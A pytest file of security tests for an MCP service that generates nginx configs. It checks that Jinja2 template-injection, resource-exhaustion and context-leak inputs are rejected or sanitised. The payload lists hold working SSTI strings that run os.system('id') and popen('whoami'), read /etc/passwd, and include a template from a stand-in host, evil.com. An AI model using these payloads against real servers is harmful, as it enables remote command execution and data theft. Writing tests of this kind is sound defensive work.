"""Template injection and rendering bug discovery tests.

These tests focus on finding real bugs in template processing by using
actual malicious and edge-case inputs that could cause security vulnerabilities
or server crashes in production.
"""

import asyncio

import pytest
from fastmcp import Client
from fastmcp.exceptions import ToolError
from swag_mcp.models.config import SwagConfigRequest
from swag_mcp.services.swag_manager import SwagManagerService


class TestTemplateInjectionBugs:
    """Bug discovery tests for template injection and rendering vulnerabilities."""

    @pytest.mark.asyncio
    async def test_server_side_template_injection_attempts(self, mcp_client: Client):
        """Test server behavior against server-side template injection attacks."""
        # These are actual SSTI payloads that could execute code or reveal information
        ssti_payloads = [
            # Jinja2 expression evaluation attempts
            "{{7*7}}",
            "{{config}}",
            "{{request}}",
            "{{self}}",
            "{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}",
            # Python code execution attempts
            "{{[].__class__.__base__.__subclasses__()[104].__init__.__globals__['sys'].exit()}}",
            "{{ config.__class__.__init__.__globals__['os'].system('id') }}",
            # Template syntax manipulation
            "{% for x in ().__class__.__base__.__subclasses__() %}{{ x }}{% endfor %}",
            "{% set x = lipsum.__globals__['os'].popen('whoami').read() %}{{ x }}",
            "{% import os %}{{ os.system('echo pwned') }}",
            # Nested template injection
            "{{ (lipsum|attr('\\x5f\\x5fglobals\\x5f\\x5f'))['os'].system('ls') }}",
            (
                "{{ request['application']['\\x5f\\x5fglobals\\x5f\\x5f']"
                "['\\x5f\\x5fbuiltins\\x5f\\x5f']['\\x5f\\x5fimport\\x5f\\x5f']"
                "('os').system('id') }}"
            ),
        ]

        for payload in ssti_payloads:
            # Test in service name (most likely to be templated)
            with pytest.raises((ToolError, Exception)) as exc_info:
                await mcp_client.call_tool(
                    "swag_create",
                    {
                        "service_name": f"test-{payload}",
                        "server_name": "safe.example.com",
                        "upstream_app": "test",
                        "upstream_port": 8080,
                    },
                )

            # Verify the payload was not executed (server should reject or sanitize)
            error_msg = str(exc_info.value).lower()
            # Should not contain evidence of code execution
            assert "pwned" not in error_msg
            assert "uid=" not in error_msg  # Output from 'id' command
            assert "/etc/passwd" not in error_msg

            # Test in server name
            with pytest.raises((ToolError, Exception)) as exc_info:
                await mcp_client.call_tool(
                    "swag_create",
                    {
                        "service_name": "safe-test",
                        "server_name": f"{payload}.example.com",
                        "upstream_app": "test",
                        "upstream_port": 8080,
                    },
                )

            # Test in upstream app name
            with pytest.raises((ToolError, Exception)) as exc_info:
                await mcp_client.call_tool(
                    "swag_create",
                    {
                        "service_name": "safe-test2",
                        "server_name": "safe.example.com",
                        "upstream_app": f"test-{payload}",
                        "upstream_port": 8080,
                    },
                )

    @pytest.mark.asyncio
    async def test_template_rendering_crash_scenarios(self, swag_service: SwagManagerService):
        """Test template rendering with inputs that could cause crashes."""
        crash_scenarios = [
            # Malformed template syntax
            {
                "service_name": "test",
                "server_name": "test.com",
                "upstream_app": "{{unclosed",
                "upstream_port": 8080,
            },
            {
                "service_name": "test",
                "server_name": "test.com",
                "upstream_app": "{% invalid syntax",
                "upstream_port": 8080,
            },
            {
                "service_name": "test",
                "server_name": "test.com",
                "upstream_app": "{{ 1/0 }}",
                "upstream_port": 8080,
            },
            # Extremely nested expressions
            {
                "service_name": "test",
                "server_name": "test.com",
                "upstream_app": "{{'{'*100}}",
                "upstream_port": 8080,
            },
            {
                "service_name": "test",
                "server_name": "test.com",
                "upstream_app": "{{'['*100}}",
                "upstream_port": 8080,
            },
            # Invalid template filters
            {
                "service_name": "test",
                "server_name": "test.com",
                "upstream_app": "{{value|nonexistent_filter}}",
                "upstream_port": 8080,
            },
            {
                "service_name": "test",
                "server_name": "test.com",
                "upstream_app": "{{value|format('')|int}}",
                "upstream_port": 8080,
            },
            # Recursive template references
            {
                "service_name": "test",
                "server_name": "{{service_name}}",
                "upstream_app": "test",
                "upstream_port": 8080,
            },
            {
                "service_name": "{{server_name}}",
                "server_name": "{{service_name}}",
                "upstream_app": "test",
                "upstream_port": 8080,
            },
        ]

        for scenario in crash_scenarios:
            try:
                request = SwagConfigRequest(**scenario)
                # This should either succeed gracefully or fail with a proper error
                result = await swag_service.create_config(request)

                # If it succeeds, verify the template variables were handled safely
                if hasattr(result, "content"):
                    content = result.content
                    # Should not contain unprocessed template syntax
                    assert "{{" not in content or "}}" not in content
                    # Should not contain error traces or stack dumps
                    assert "traceback" not in content.lower()
                    assert "exception" not in content.lower()

                # Clean up if config was created
                config_file = swag_service.config_path / result.filename
                if config_file.exists():
                    config_file.unlink()

            except Exception as e:
                # If it fails, should be a proper handled exception, not a crash
                error_msg = str(e).lower()
                assert "traceback" not in error_msg
                assert "internal server error" not in error_msg
                # Should be a descriptive validation error
                assert any(
                    word in error_msg for word in ["invalid", "template", "syntax", "validation"]
                )

    @pytest.mark.asyncio
    async def test_template_resource_exhaustion(self, swag_service: SwagManagerService):
        """Test template rendering with inputs designed to exhaust resources."""
        # Test extremely large template variables
        large_string = "A" * 1000000  # 1MB string
        huge_string = "B" * 10000000  # 10MB string

        resource_exhaustion_tests = [
            # Large template variables
            {
                "service_name": "test1",
                "server_name": "test.com",
                "upstream_app": large_string,
                "upstream_port": 8080,
            },
            {
                "service_name": large_string[:100],
                "server_name": "test.com",
                "upstream_app": "test",
                "upstream_port": 8080,
            },
            {
                "service_name": "test2",
                "server_name": huge_string[:253],
                "upstream_app": "test",
                "upstream_port": 8080,
            },
            # Template loops that could consume excessive resources
            {
                "service_name": "test3",
                "server_name": "test.com",
                "upstream_app": "{%for i in range(100000)%}X{%endfor%}",
                "upstream_port": 8080,
            },
            # Deeply nested template structures
            {
                "service_name": "test4",
                "server_name": "test.com",
                "upstream_app": "{{" + ("dict(" * 1000) + ")" * 1000 + "}}",
                "upstream_port": 8080,
            },
        ]

        for test_data in resource_exhaustion_tests:
            try:
                request = SwagConfigRequest(**test_data)

                # Set a reasonable timeout to prevent hanging
                result = await asyncio.wait_for(swag_service.create_config(request), timeout=10.0)

                # If successful, verify reasonable resource usage
                if hasattr(result, "content") and result.content:
                    # Content should not be excessively large
                    assert len(result.content) < 50000000  # Max 50MB output

                # Clean up
                config_file = swag_service.config_path / result.filename
                if config_file.exists():
                    config_file.unlink()

            except TimeoutError:
                # Template took too long - this indicates a resource exhaustion bug
                pytest.fail(f"Template rendering timed out with input: {test_data}")

            except MemoryError:
                # Memory exhaustion - this indicates a resource exhaustion bug
                pytest.fail(f"Template rendering caused memory exhaustion with input: {test_data}")

            except Exception as e:
                # Should fail gracefully with proper error handling
                error_msg = str(e).lower()
                assert any(
                    word in error_msg for word in ["invalid", "too large", "limit", "validation"]
                )

    @pytest.mark.asyncio
    async def test_template_variable_edge_cases(self, swag_service: SwagManagerService):
        """Test template rendering with unusual variable types and values."""
        edge_case_tests = [
            # Non-string template variables that might cause type errors
            {
                "service_name": "test1",
                "server_name": "test.com",
                "upstream_app": "test",
                "upstream_port": "notanint",
            },
            # Unicode and special characters in template variables
            {
                "service_name": "测试",
                "server_name": "测试.com",
                "upstream_app": "测试",
                "upstream_port": 8080,
            },
            {
                "service_name": "тест",
                "server_name": "тест.com",
                "upstream_app": "тест",
                "upstream_port": 8080,
            },
            {
                "service_name": "🚀test",
                "server_name": "🚀.com",
                "upstream_app": "🚀",
                "upstream_port": 8080,
            },
            # Control characters and special whitespace
            {
                "service_name": "test\x00",
                "server_name": "test.com",
                "upstream_app": "test",
                "upstream_port": 8080,
            },
            {
                "service_name": "test\n\r\t",
                "server_name": "test.com",
                "upstream_app": "test",
                "upstream_port": 8080,
            },
            {
                "service_name": "test\u200b",
                "server_name": "test.com",
                "upstream_app": "test",
                "upstream_port": 8080,
            },  # Zero-width space
            # Very long variable names/values
            {
                "service_name": "a" * 1000,
                "server_name": "test.com",
                "upstream_app": "test",
                "upstream_port": 8080,
            },
        ]

        for test_data in edge_case_tests:
            try:
                request = SwagConfigRequest(**test_data)
                result = await swag_service.create_config(request)

                # If successful, verify template was rendered safely
                if hasattr(result, "content"):
                    content = result.content
                    # Should not contain raw Python objects or error traces
                    assert "<object" not in content
                    assert "TypeError" not in content
                    assert "UnicodeError" not in content

                # Clean up
                config_file = swag_service.config_path / result.filename
                if config_file.exists():
                    config_file.unlink()

            except Exception as e:
                # Should fail with proper validation errors, not internal errors
                error_msg = str(e).lower()
                assert "internal error" not in error_msg
                assert any(
                    word in error_msg for word in ["invalid", "validation", "character", "format"]
                )

    @pytest.mark.asyncio
    async def test_template_context_pollution_attacks(self, swag_service: SwagManagerService):
        """Test for template context pollution that could lead to information disclosure."""
        # Attempt to access template context variables that shouldn't be accessible
        context_pollution_attempts = [
            "{{self.__dict__}}",
            "{{config.__dict__}}",
            "{{request.__dict__}}",
            "{{lipsum.__globals__}}",
            "{{cycler.__init__.__globals__}}",
            "{{joiner.__init__.__globals__}}",
            "{{namespace.__init__.__globals__}}",
        ]

        for attempt in context_pollution_attempts:
            try:
                request = SwagConfigRequest(
                    service_name="context-test",
                    server_name="test.com",
                    upstream_app=attempt,
                    upstream_port=8080,
                )
                result = await swag_service.create_config(request)

                if hasattr(result, "content"):
                    content = result.content.lower()
                    # Should not contain sensitive information
                    assert "password" not in content
                    assert "secret" not in content
                    assert "token" not in content
                    assert "__globals__" not in content
                    assert "built-in" not in content
                    # Should not contain Python object representations
                    assert "<function" not in content
                    assert "<module" not in content

                # Clean up
                config_file = swag_service.config_path / result.filename
                if config_file.exists():
                    config_file.unlink()

            except Exception:
                # Expected to fail - context pollution should be blocked
                pass

    @pytest.mark.asyncio
    async def test_template_include_and_import_attacks(self, mcp_client: Client, mock_config):
        """Test attempts to include/import unauthorized templates or modules."""
        include_import_attacks = [
            # Template include attacks
            "{% include '/etc/passwd' %}",
            "{% include '../../../sensitive.txt' %}",
            "{% include 'http://evil.com/malicious.j2' %}",
            # Import attacks
            "{% import 'os' %}{{ os.system('whoami') }}",
            "{% from 'subprocess' import call %}{{ call(['id']) }}",
            "{% set x = __import__('os') %}{{ x.system('pwd') }}",
        ]

        for attack in include_import_attacks:
            with pytest.raises((ToolError, Exception)) as exc_info:
                # Test in config content through edit
                await mcp_client.call_tool(
                    "swag_create",
                    {
                        "service_name": "include-test",
                        "server_name": "test.com",
                        "upstream_app": "test",
                        "upstream_port": 8080,
                    },
                )

                # Then try to edit with malicious content
                malicious_content = f"""server {{
    listen 443;
    server_name test.com;
    location / {{
        # {attack}
        proxy_pass http://test:8080;
    }}
}}"""

                await mcp_client.call_tool(
                    "swag_edit",
                    {
                        "config_name": "include-test.subdomain.conf",
                        "new_content": malicious_content,
                    },
                )

            # Should either be blocked or sanitized
            error_msg = str(exc_info.value).lower()
            # Should not contain evidence of successful inclusion
            assert "root:" not in error_msg  # /etc/passwd content
            assert "uid=" not in error_msg  # Command execution output
